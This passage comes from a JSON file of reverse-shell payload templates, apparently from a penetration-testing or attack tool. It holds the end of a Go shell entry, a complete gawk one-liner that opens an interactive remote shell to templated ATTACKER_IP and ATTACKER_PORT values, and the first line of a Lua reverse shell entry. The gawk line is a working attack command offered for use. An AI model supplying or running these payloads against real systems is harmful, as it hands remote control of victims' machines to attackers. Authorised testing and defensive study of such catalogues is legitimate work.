    "usage": "Compile with: go build shell.go",
    "variables": ["ATTACKER_IP", "ATTACKER_PORT"],
    "os": "linux"
  },
  
  "awk_reverse": {
    "name": "AWK Reverse Shell",
    "description": "AWK-based reverse shell",
    "code": "awk 'BEGIN {s = \"/inet/tcp/0/{{ATTACKER_IP}}/{{ATTACKER_PORT}}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
    "usage": "Works on systems with gawk",
    "variables": ["ATTACKER_IP", "ATTACKER_PORT"],
    "os": "linux",
    "requirements": ["gawk"]
  },
  
  "lua_reverse": {
    "name": "Lua Reverse Shell",
